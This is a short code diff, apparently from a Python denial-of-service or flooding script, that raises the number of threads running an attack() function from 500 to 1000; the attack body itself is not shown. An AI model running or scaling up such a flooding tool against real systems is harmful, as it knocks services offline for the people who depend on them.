@@ -19,6 +19,6 @@ def attack():
         
         s.close()
 
-for i in range(500):
+for i in range(1000):
     thread = threading.Thread(target=attack)
     thread.start()
